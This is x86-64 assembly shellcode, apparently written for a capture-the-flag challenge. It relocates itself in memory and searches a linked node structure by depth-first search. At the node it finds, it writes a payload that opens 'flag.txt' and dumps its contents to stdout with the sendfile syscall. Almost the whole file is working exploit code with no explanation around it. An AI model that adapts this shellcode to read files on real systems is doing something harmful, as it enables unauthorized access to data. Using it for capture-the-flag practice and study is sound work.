    [bits 64]
orig_home equ entry-0x800
code equ orig_home+0x200
stack equ orig_home+0x1000

    ;; We live at node + 0x800, so set up a stack.
entry:
    lea rsp, [rel stack]
    mov rbp, rsp

    ;; Now let's give ourselves some more space
    lea rdi, [rel code]
    lea rsi, [rel entry]
    mov ecx, code_len
    rep movsb
    lea rdx, [rel code+done_reloc-entry]
    lea rax, [rel orig_home]
    jmp rdx

done_reloc:
    ;; cur: rax
dfs:
    cmp byte [rax], 1
    je done
    xor ecx, ecx
link_loop:
    cmp dword [rax + 4], ecx
    jle backtrack
    mov rbx, rbp
    sub rbx, rsp
    cmp rbx, 210
    jge backtrack

    lea rdx, [rsp + 8]
find_loop:
    cmp rdx, rbp
    jge not_found
    cmp qword [rdx], rax
    je backtrack
    add rdx, 8
    jmp find_loop

not_found:
    push rax
    push rcx
    mov rax, qword [rax + rcx*8 + 8]
    jmp dfs

backtrack:
    pop rcx
    pop rax
    inc ecx
    jmp link_loop

done:
    mov rdi, rax
    lea rsi, [rel payload]
    mov ecx, payload_len
    rep movsb
    jmp rax

payload:
    push 1
    dec byte [rsp]
    mov rax, 0x7478742e67616c66
    push rax
    push 2
    pop rax
    mov rdi, rsp
    xor esi, esi
    syscall
    mov r10d, 0x7fffffff
    mov rsi, rax
    push 0x28
    pop rax
    push 1
    pop rdi
    cdq
    syscall
    mov eax, 60
    syscall

payload_len equ $-payload
code_len equ $-entry
